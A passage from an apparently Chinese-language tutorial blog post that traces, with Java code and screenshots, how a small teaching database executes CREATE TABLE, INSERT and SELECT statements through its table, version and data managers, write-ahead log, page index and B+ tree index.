    <span class="hljs-keyword">if</span>(xid == <span class="hljs-number">0</span>) &#123;  
        <span class="hljs-keyword">throw</span> Error.NoTransactionException;  
    &#125;  
    <span class="hljs-type">byte</span>[] res = tbm.abort(xid);  
    xid = <span class="hljs-number">0</span>;  
    <span class="hljs-keyword">return</span> res;  
&#125; <span class="hljs-keyword">else</span> &#123;  
	<span class="hljs-comment">// execute2就是执行CRUD操作的sql</span>
    <span class="hljs-keyword">return</span> execute2(stat);  
&#125;</code></pre>

<h4 id="创建一张表"><a href="#创建一张表" class="headerlink" title="创建一张表"></a>创建一张表</h4><blockquote>
<p>假设execute2此时执行的是下面的sql语句</p>
</blockquote>
<pre><code class="hljs java"><span class="hljs-comment">// create table students  name string,age int32  (index name age)</span>
String ss=<span class="hljs-string">&quot;create table students &quot;</span> +  
        <span class="hljs-string">&quot;name string,age int32 &quot;</span> +  
        <span class="hljs-string">&quot;(index name age)&quot;</span>;  
<span class="hljs-type">byte</span> b[]=ss.getBytes(StandardCharsets.UTF_8);  
<span class="hljs-type">Object</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> Parser.Parse(b);
tbm.create(xid,(Create) stat);</code></pre>

<h4 id="首先会到表的缓存查询是否存在该表名"><a href="#首先会到表的缓存查询是否存在该表名" class="headerlink" title="首先会到表的缓存查询是否存在该表名"></a>首先会到表的缓存查询是否存在该表名</h4><p>也就是第一个if语句中的代码</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] create(<span class="hljs-type">long</span> xid, Create create) <span class="hljs-keyword">throws</span> Exception &#123;  
    lock.lock();  
    <span class="hljs-keyword">try</span> &#123;  
	    <span class="hljs-comment">// 此处代码</span>
        <span class="hljs-keyword">if</span>(tableCache.containsKey(create.tableName)) &#123;  
            <span class="hljs-keyword">throw</span> Error.DuplicatedTableException;  
        &#125;  
        <span class="hljs-type">Table</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> Table.createTable(<span class="hljs-built_in">this</span>, firstTableUid(), xid, create);
        updateFirstTableUid(table.uid);  
        tableCache.put(create.tableName, table);  
        <span class="hljs-keyword">if</span>(!xidTableCache.containsKey(xid)) &#123;  
            xidTableCache.put(xid, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;());  
        &#125;  
        xidTableCache.get(xid).add(table);  
        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;create &quot;</span> + create.tableName).getBytes();  
    &#125; <span class="hljs-keyword">finally</span> &#123;  
        lock.unlock();  
    &#125;  
&#125;</code></pre>

<ul>
<li>如果存在，说明表名重复，抛出异常</li>
<li>如果没有，则创建一张新表</li>
</ul>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] create(<span class="hljs-type">long</span> xid, Create create) <span class="hljs-keyword">throws</span> Exception &#123;  
    lock.lock();  
    <span class="hljs-keyword">try</span> &#123;  
        <span class="hljs-keyword">if</span>(tableCache.containsKey(create.tableName)) &#123;  
            <span class="hljs-keyword">throw</span> Error.DuplicatedTableException;  
        &#125;  
        <span class="hljs-comment">// 接下来解释的是这一行代码的执行过程  </span>
        <span class="hljs-type">Table</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> Table.createTable(<span class="hljs-built_in">this</span>, firstTableUid(), xid, create);
        updateFirstTableUid(table.uid);  
        tableCache.put(create.tableName, table);  
        <span class="hljs-keyword">if</span>(!xidTableCache.containsKey(xid)) &#123;  
            xidTableCache.put(xid, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;());  
        &#125;  
        xidTableCache.get(xid).add(table);  
        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;create &quot;</span> + create.tableName).getBytes();  
    &#125; <span class="hljs-keyword">finally</span> &#123;  
        lock.unlock();  
    &#125;  
&#125;</code></pre>

<p>接下来将进入最核心的代码块中<code>Table table = Table.createTable(this, firstTableUid(), xid, create); </code></p>
<h4 id="进入Table-createTable"><a href="#进入Table-createTable" class="headerlink" title="进入Table.createTable"></a>进入Table.createTable</h4><pre><code class="hljs java"><span class="hljs-comment">// 创建一个新的Table对象，并根据传入的Create对象创建字段  nextUid = 0</span>
<span class="hljs-type">Table</span> <span class="hljs-variable">tb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Table</span>(tbm, create.tableName, nextUid);  
<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; create.fieldName.length; i ++) &#123;  
    <span class="hljs-type">String</span> <span class="hljs-variable">fieldName</span> <span class="hljs-operator">=</span> create.fieldName[i];  
    <span class="hljs-type">String</span> <span class="hljs-variable">fieldType</span> <span class="hljs-operator">=</span> create.fieldType[i];  
    <span class="hljs-type">boolean</span> <span class="hljs-variable">indexed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; create.index.length; j ++) &#123;  
        <span class="hljs-keyword">if</span>(fieldName.equals(create.index[j])) &#123;  
            indexed = <span class="hljs-literal">true</span>;  
            <span class="hljs-keyword">break</span>;  
        &#125;  
    &#125;
    <span class="hljs-comment">// 创建字段</span>
        tb.fields.add(Field.createField(tb, xid, fieldName, fieldType, indexed));  
    <span class="hljs-comment">// 将新建的Field对象添加到Table对象的fields列表中  </span>
&#125;
</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324175248.png"><br>在for循环中取出表的所有字段信息和类型，并判断是否为索引类型，接着创建字段信息</p>
<h4 id="进入Field-createField代码逻辑"><a href="#进入Field-createField代码逻辑" class="headerlink" title="进入Field.createField代码逻辑"></a>进入Field.createField代码逻辑</h4><pre><code class="hljs java">typeCheck(fieldType);  
<span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Field</span>(tb, fieldName, fieldType, <span class="hljs-number">0</span>);  
<span class="hljs-keyword">if</span>(indexed) &#123;  
    <span class="hljs-type">long</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> BPlusTree.create(((TableManagerImpl)tb.tbm).dm);  
    <span class="hljs-type">BPlusTree</span> <span class="hljs-variable">bt</span> <span class="hljs-operator">=</span> BPlusTree.load(index, ((TableManagerImpl)tb.tbm).dm);  
    f.index = index;  
    f.bt = bt;  
&#125;  
f.persistSelf(xid);  
<span class="hljs-keyword">return</span> f;</code></pre>

<p>如果该字段是索引类型，将会为该索引创建B+树，以上参数信息如下<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324180543.png"></p>
<p>![]</p>
<h4 id="persistSelf"><a href="#persistSelf" class="headerlink" title="persistSelf()"></a>persistSelf()</h4><p>最后会执行<code>persistSelf()</code>，将字段数据写入磁盘</p>
<pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">persistSelf</span><span class="hljs-params">(<span class="hljs-type">long</span> xid)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    <span class="hljs-type">byte</span>[] nameRaw = Parser.string2Byte(fieldName);  
    <span class="hljs-type">byte</span>[] typeRaw = Parser.string2Byte(fieldType);  
    <span class="hljs-type">byte</span>[] indexRaw = Parser.long2Byte(index);  
    <span class="hljs-built_in">this</span>.uid = ((TableManagerImpl)tb.tbm).vm.insert(xid, Bytes.concat(nameRaw, typeRaw, indexRaw));  
&#125;</code></pre>

<p>将字段名、类型以及索引值转换为byte类型，交给vm插入<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/1679654859017.jpg"></p>
<h4 id="进入-TableManagerImpl-tb-tbm-vm-insert逻辑"><a href="#进入-TableManagerImpl-tb-tbm-vm-insert逻辑" class="headerlink" title="进入((TableManagerImpl)tb.tbm).vm.insert逻辑"></a>进入((TableManagerImpl)tb.tbm).vm.insert逻辑</h4><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-type">long</span> xid, <span class="hljs-type">byte</span>[] data)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    lock.lock();  
    <span class="hljs-type">Transaction</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> activeTransaction.get(xid);   <span class="hljs-comment">//从活跃的事务列表中取出该事务</span>
    lock.unlock();  
  
    <span class="hljs-keyword">if</span>(t.err != <span class="hljs-literal">null</span>) &#123;  
        <span class="hljs-keyword">throw</span> t.err;  
    &#125;  
	<span class="hljs-comment">// 将数据拼接成一个Entry</span>
    <span class="hljs-type">byte</span>[] raw = Entry.wrapEntryRaw(xid, data);  
    <span class="hljs-comment">// 插入DataItem的Data位置</span>
    <span class="hljs-keyword">return</span> dm.insert(xid, raw);  
&#125;</code></pre>

<p>该段中raw的数据如下，就是在VM模块中介绍的Entry的存储结构<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324181517.png"></p>
<h4 id="进入dm-insert-执行流程"><a href="#进入dm-insert-执行流程" class="headerlink" title="进入dm.insert()执行流程"></a>进入dm.insert()执行流程</h4><pre><code class="hljs java"><span class="hljs-type">byte</span>[] raw = DataItem.wrapDataItemRaw(data);  
<span class="hljs-keyword">if</span>(raw.length &gt; PageX.MAX_FREE_SPACE) &#123;  
    <span class="hljs-keyword">throw</span> Error.DataTooLargeException;  
&#125;</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324185356.png"><br>使用<code>PageIndex</code>选择合适的页面进行存储</p>
<pre><code class="hljs java"><span class="hljs-type">PageInfo</span> <span class="hljs-variable">pi</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  
<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i ++) &#123;  
    pi = pIndex.select(raw.length);  
    <span class="hljs-keyword">if</span> (pi != <span class="hljs-literal">null</span>) &#123;  
        <span class="hljs-keyword">break</span>;  
    &#125; <span class="hljs-keyword">else</span> &#123;  
        <span class="hljs-type">int</span> <span class="hljs-variable">newPgno</span> <span class="hljs-operator">=</span> pc.newPage(PageX.initRaw());  
        pIndex.add(newPgno, PageX.MAX_FREE_SPACE);  
    &#125;  
&#125;</code></pre>

<p>取出page，插入insertLog，用于恢复时使用</p>
<pre><code class="hljs java">pg = pc.getPage(pi.pgno);  
<span class="hljs-type">byte</span>[] log = Recover.insertLog(xid, pg, raw);  <span class="hljs-comment">// 解析出log返回，log的格式如下图</span>
logger.log(log);  <span class="hljs-comment">// 向.log文件中写入log，并更行日志文件的校验和，用于数据恢复</span>
<span class="hljs-type">short</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> PageX.insert(pg, raw);  <span class="hljs-comment">// .db文件中写入真正的数据</span>
  
pg.release();  
<span class="hljs-keyword">return</span> Types.addressToUid(pi.pgno, offset);


<span class="hljs-keyword">finally</span> &#123;  
    <span class="hljs-comment">// 将取出的pg重新插入pIndex  </span>
    <span class="hljs-keyword">if</span>(pg != <span class="hljs-literal">null</span>) &#123;  
        pIndex.add(pi.pgno, PageX.getFreeSpace(pg));  
    &#125; <span class="hljs-keyword">else</span> &#123;  
        pIndex.add(pi.pgno, freeSpace);  
    &#125;  
&#125;</code></pre>

<p>&#x3D;&#x3D;以上代码都在dm.insert()中&#x3D;&#x3D;<br>log变量的存储结构如下所示<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324191950.png"><br>最后返回插入位置的偏移量<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324192830.png"><br><code>PageX.inset()</code>的代码逻辑</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">short</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(Page pg, <span class="hljs-type">byte</span>[] raw)</span> &#123;  
    pg.setDirty(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 此时该位置数据更新 所以为脏数据  </span>
    <span class="hljs-type">short</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> getFSO(pg.getData()); <span class="hljs-comment">// 获取空闲位置的偏移 在之后插入数据  </span>
    System.arraycopy(raw, <span class="hljs-number">0</span>, pg.getData(), offset, raw.length);  <span class="hljs-comment">// 将数据拷贝到指定的内存地址</span>
    setFSO(pg.getData(), (<span class="hljs-type">short</span>)(offset + raw.length));  <span class="hljs-comment">// 更新FSO</span>
    <span class="hljs-keyword">return</span> offset;  
&#125;</code></pre>

<p>完成上面的一系列操作后，sql的执行过程已经持久化到磁盘中。</p>
<h4 id="回到tbm-create-xid-Create-stat-96-中"><a href="#回到tbm-create-xid-Create-stat-96-中" class="headerlink" title="回到tbm.create(xid,(Create) stat);&#96;中"></a>回到tbm.create(xid,(Create) stat);&#96;中</h4><pre><code class="hljs java">updateFirstTableUid(table.uid);  <span class="hljs-comment">// 更新.tb文件</span>
tableCache.put(create.tableName, table);  
<span class="hljs-keyword">if</span>(!xidTableCache.containsKey(xid)) &#123;  
    xidTableCache.put(xid, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;());  
&#125;  
xidTableCache.get(xid).add(table);  
<span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;create &quot;</span> + create.tableName).getBytes();</code></pre>

<p><code>updateFirstTableUid()</code>用于将新增表的uid更新到<code>.tb</code>文件中，该函数会调用<code>Booter.update()</code>函数，该函数在更新<code>.tb</code>文件时，用创建一个新文件其后缀为<code>.bt_tmp</code><br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324215438.png"><br>之后，将新数据写入该文件，再将<code>.bt</code>文件中的内容拷贝到临时文件<code>.bt_tmp</code>中，准备好全部数据后，会用<code>.bt_tmp</code>将原来的<code>.bt</code>文件覆盖。如此更新数据，是为了保证更新数据的原子性。</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data)</span> &#123;  
    <span class="hljs-type">File</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path + BOOTER_TMP_SUFFIX);  
    <span class="hljs-keyword">try</span> &#123;  
        tmp.createNewFile();  
    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  
        Panic.panic(e);  
    &#125;  
    <span class="hljs-keyword">if</span>(!tmp.canRead() || !tmp.canWrite()) &#123;  
        Panic.panic(Error.FileCannotRWException);  
    &#125;  
    <span class="hljs-keyword">try</span>(<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(tmp)) &#123;  
        out.write(data);  
        out.flush();  
    &#125; <span class="hljs-keyword">catch</span>(IOException e) &#123;  
        Panic.panic(e);  
    &#125;  
    <span class="hljs-keyword">try</span> &#123;  
    <span class="hljs-comment">// 覆盖原文件</span>
        Files.move(tmp.toPath(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path+BOOTER_SUFFIX).toPath(), StandardCopyOption.REPLACE_EXISTING);  
    &#125; <span class="hljs-keyword">catch</span>(IOException e) &#123;  
        Panic.panic(e);  
    &#125;  
    <span class="hljs-comment">// 返回新的File对象</span>
    file = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path+BOOTER_SUFFIX);  
    <span class="hljs-keyword">if</span>(!file.canRead() || !file.canWrite()) &#123;  
        Panic.panic(Error.FileCannotRWException);  
    &#125;  
&#125;</code></pre>

<p>接着继续回到<code>tbm.create(xid,(Create) stat)</code>中，后面的代码相对简单。</p>
<pre><code class="hljs java">tableCache.put(create.tableName, table);  <span class="hljs-comment">// 将创建好的表名放进 表缓存tableCache，方便下次创建表时，进行表名重复的检查</span>

<span class="hljs-comment">// xidTableCache 存放的是事务xid创建的table集合</span>
<span class="hljs-keyword">if</span>(!xidTableCache.containsKey(xid)) &#123;  <span class="hljs-comment">// 如果该事务xid 不在xidTableCache中，则将其加入</span>
	xidTableCache.put(xid, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;());  
&#125;  
<span class="hljs-comment">// 将创建的表名加入 </span>
xidTableCache.get(xid).add(table);  
<span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;create &quot;</span> + create.tableName).getBytes();  <span class="hljs-comment">// 返回此次sql语句执行的结果</span></code></pre>

<h3 id="8-执行插入的SQL语句"><a href="#8-执行插入的SQL语句" class="headerlink" title="8.执行插入的SQL语句"></a>8.执行插入的SQL语句</h3><pre><code class="hljs java">ss=<span class="hljs-string">&quot;insert into students values xiaohong 18&quot;</span>;  
b=ss.getBytes(StandardCharsets.UTF_8);  
stat = Parser.Parse(b);  
tbm.insert(xid,(Insert) stat);</code></pre>

<p>解析出的sql语句<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324223619.png"><br><code>tbm.insert()</code>中的代码</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>  
<span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] insert(<span class="hljs-type">long</span> xid, Insert insert) <span class="hljs-keyword">throws</span> Exception &#123;  
    lock.lock();  
    <span class="hljs-type">Table</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> tableCache.get(insert.tableName);  
    lock.unlock();  
    <span class="hljs-keyword">if</span>(table == <span class="hljs-literal">null</span>) &#123;  
        <span class="hljs-keyword">throw</span> Error.TableNotFoundException;  
    &#125;  
    table.insert(xid, insert);  
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;insert&quot;</span>.getBytes();  
&#125;</code></pre>

<p>首先检查表名是否存在，不在则抛出<code>TableNotFoundException</code>异常<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324224735.png"><br>如果存在，则进入<code>table.insert(xid, insert)</code>,代码如下</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-type">long</span> xid, Insert insert)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    Map&lt;String, Object&gt; entry = string2Entry(insert.values);  
    <span class="hljs-type">byte</span>[] raw = entry2Raw(entry);  
    <span class="hljs-type">long</span> <span class="hljs-variable">uid</span> <span class="hljs-operator">=</span> ((TableManagerImpl)tbm).vm.insert(xid, raw);  
    <span class="hljs-keyword">for</span> (Field field : fields) &#123;  
        <span class="hljs-keyword">if</span>(field.isIndexed()) &#123;  
            field.insert(entry.get(field.fieldName), uid);  
        &#125;  
    &#125;  
&#125;</code></pre>

<p>首先将SQL语句转换成一条Entry<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324230818.png"><br>接着进入<code>long uid = ((TableManagerImpl)tbm).vm.insert(xid, raw);</code></p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>  
<span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-type">long</span> xid, <span class="hljs-type">byte</span>[] data)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    lock.lock();  
    <span class="hljs-type">Transaction</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> activeTransaction.get(xid);  
    lock.unlock();  
  
    <span class="hljs-keyword">if</span>(t.err != <span class="hljs-literal">null</span>) &#123;  
        <span class="hljs-keyword">throw</span> t.err;  
    &#125;  
  
    <span class="hljs-type">byte</span>[] raw = Entry.wrapEntryRaw(xid, data);  
    <span class="hljs-keyword">return</span> dm.insert(xid, raw);  
&#125;</code></pre>

<p><code>raw</code>的数据结构如下<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324231556.png"><br>进入<code>dm.insert(xid, raw)</code>，与创建表的过程一样</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-type">long</span> xid, <span class="hljs-type">byte</span>[] data)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    <span class="hljs-type">byte</span>[] raw = DataItem.wrapDataItemRaw(data);  
    <span class="hljs-keyword">if</span>(raw.length &gt; PageX.MAX_FREE_SPACE) &#123;  
        <span class="hljs-keyword">throw</span> Error.DataTooLargeException;  
    &#125;  
  
    <span class="hljs-type">PageInfo</span> <span class="hljs-variable">pi</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i ++) &#123;  
        pi = pIndex.select(raw.length);  
        <span class="hljs-keyword">if</span> (pi != <span class="hljs-literal">null</span>) &#123;  
            <span class="hljs-keyword">break</span>;  
        &#125; <span class="hljs-keyword">else</span> &#123;  
            <span class="hljs-type">int</span> <span class="hljs-variable">newPgno</span> <span class="hljs-operator">=</span> pc.newPage(PageX.initRaw());  
            pIndex.add(newPgno, PageX.MAX_FREE_SPACE);  
        &#125;  
    &#125;  
    <span class="hljs-keyword">if</span>(pi == <span class="hljs-literal">null</span>) &#123;  
        <span class="hljs-keyword">throw</span> Error.DatabaseBusyException;  
    &#125;</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324232309.png"></p>
<pre><code class="hljs java">    <span class="hljs-type">Page</span> <span class="hljs-variable">pg</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  
    <span class="hljs-type">int</span> <span class="hljs-variable">freeSpace</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  
    <span class="hljs-keyword">try</span> &#123;  
        pg = pc.getPage(pi.pgno);  
        <span class="hljs-type">byte</span>[] log = Recover.insertLog(xid, pg, raw);  
        logger.log(log);  
  
        <span class="hljs-type">short</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> PageX.insert(pg, raw);  
  
        pg.release();  
        <span class="hljs-keyword">return</span> Types.addressToUid(pi.pgno, offset);  
  
    &#125; <span class="hljs-keyword">finally</span> &#123;  
        <span class="hljs-comment">// 将取出的pg重新插入pIndex  </span>
        <span class="hljs-keyword">if</span>(pg != <span class="hljs-literal">null</span>) &#123;  
            pIndex.add(pi.pgno, PageX.getFreeSpace(pg));  
        &#125; <span class="hljs-keyword">else</span> &#123;  
            pIndex.add(pi.pgno, freeSpace);  
        &#125;  
    &#125;  
&#125;</code></pre>

<p>log的数据结构如下<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324232631.png"><br><code>logger.log(log)</code>中</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data)</span> &#123;  
    <span class="hljs-type">byte</span>[] log = wrapLog(data);  
    <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> ByteBuffer.wrap(log);  
    lock.lock();  
    <span class="hljs-keyword">try</span> &#123;  
        fc.position(fc.size());  
        fc.write(buf);  
    &#125; <span class="hljs-keyword">catch</span>(IOException e) &#123;  
        Panic.panic(e);  
    &#125; <span class="hljs-keyword">finally</span> &#123;  
        lock.unlock();  
    &#125;  
    <span class="hljs-comment">// 添加log后需要对log文件的头部的校验和进行更新  </span>
    updateXChecksum(log);  
&#125;</code></pre>

<p>log被进一步被打包成下面的结构<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324233431.png"><br>接着将log写入到<code>.log</code>文件中，最后更新整个文件的校验和<code>updateXChecksum(log)</code>，之后回到</p>
<pre><code class="hljs java"><span class="hljs-type">short</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> PageX.insert(pg, raw);  

pg.release();  
<span class="hljs-keyword">return</span> Types.addressToUid(pi.pgno, offset);</code></pre>

<p>进入<code>short offset = PageX.insert(pg, raw); </code>,将<code>raw</code>数据写入磁盘中</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">short</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(Page pg, <span class="hljs-type">byte</span>[] raw)</span> &#123;  
    pg.setDirty(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 此时该位置数据更新 所以为脏数据  </span>
    <span class="hljs-type">short</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> getFSO(pg.getData()); <span class="hljs-comment">// 获取空闲位置的偏移 在之后插入数据  </span>
    System.arraycopy(raw, <span class="hljs-number">0</span>, pg.getData(), offset, raw.length);  
    setFSO(pg.getData(), (<span class="hljs-type">short</span>)(offset + raw.length));  
    <span class="hljs-keyword">return</span> offset;  
&#125;</code></pre>

<p>写入 磁盘后将page,放回pageIndex中</p>
<pre><code class="hljs java"><span class="hljs-keyword">finally</span> &#123;  
    <span class="hljs-comment">// 将取出的pg重新插入pIndex  </span>
   <span class="hljs-keyword">if</span>(pg != <span class="hljs-literal">null</span>) &#123;  
        pIndex.add(pi.pgno, PageX.getFreeSpace(pg));  
    &#125; <span class="hljs-keyword">else</span> &#123;  
        pIndex.add(pi.pgno, freeSpace);  
    &#125;  
&#125;</code></pre>

<p>以上是将sql的执行日志保存下来，用于recover，<br>回到<code>table.insert(xid, insert)</code>中<br>接下来才是真正写数据的过程</p>
<pre><code class="hljs java"><span class="hljs-keyword">for</span> (Field field : fields) &#123;  
    <span class="hljs-keyword">if</span>(field.isIndexed()) &#123;  
        field.insert(entry.get(field.fieldName), uid);  
    &#125;  
&#125;</code></pre>

<p><code>field.insert()</code>向b+树插入数据</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(Object key, <span class="hljs-type">long</span> uid)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    <span class="hljs-type">long</span> <span class="hljs-variable">uKey</span> <span class="hljs-operator">=</span> value2Uid(key);  
    bt.insert(uKey, uid);  
&#125;</code></pre>

<p>执行完以上步骤回到<code>tbm.insert()</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;insert&quot;</span>.getBytes();</code></pre>

<p>返回到主函数，执行结束。</p>
<h3 id="9-查询语句执行流程"><a href="#9-查询语句执行流程" class="headerlink" title="9.查询语句执行流程"></a>9.查询语句执行流程</h3><p>以下面的的sql语句作为例子</p>
<pre><code class="hljs java">ss=<span class="hljs-string">&quot;select name,age from students where age=18&quot;</span>;  
b=ss.getBytes(StandardCharsets.UTF_8);  
stat = Parser.Parse(b);  
<span class="hljs-type">byte</span>[] output=tbm.read(xid,(Select) stat);</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230325105353.png"></p>
<p>进入<code>tbm.read(xid, (Select) stat)</code>，同样先查询是否存在该表<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230325105541.png"><br>进入<code>table.read(xid, read);</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">long</span> xid, Select read)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    <span class="hljs-comment">// 解析where条件并得到需要查询的uid列表  </span>
    List&lt;Long&gt; uids = parseWhere(read.where);  
    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();  
    <span class="hljs-comment">// 循环遍历uids列表，逐个查询对应的记录，并输出结果  </span>
    <span class="hljs-keyword">for</span> (Long uid : uids) &#123;  
        <span class="hljs-type">byte</span>[] raw = ((TableManagerImpl)tbm).vm.read(xid, uid);  
        <span class="hljs-keyword">if</span>(raw == <span class="hljs-literal">null</span>) <span class="hljs-keyword">continue</span>;  
        Map&lt;String, Object&gt; entry = parseEntry(raw);  
        sb.append(printEntry(entry)).append(<span class="hljs-string">&quot;\n&quot;</span>);  
    &#125;  
    <span class="hljs-keyword">return</span> sb.toString();  
&#125;</code></pre>

<p>首先解析where条件中的字段以及数据<code>parseWhere(Where where)</code>，这一步主要就是找到where条件查询的字段，交给<code>calWhere(fd, where)</code>查找出条件的上下界，其中逻辑比较简单，不在赘述。</p>
<pre><code class="hljs java"><span class="hljs-keyword">private</span> CalWhereRes <span class="hljs-title function_">calWhere</span><span class="hljs-params">(Field fd, Where where)</span> <span class="hljs-keyword">throws</span> Exception &#123;  
    <span class="hljs-type">CalWhereRes</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CalWhereRes</span>();  
    <span class="hljs-keyword">switch</span>(where.logicOp) &#123;  
        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;&quot;</span>:  <span class="hljs-comment">// 单个where条件</span>
            res.single = <span class="hljs-literal">true</span>;  
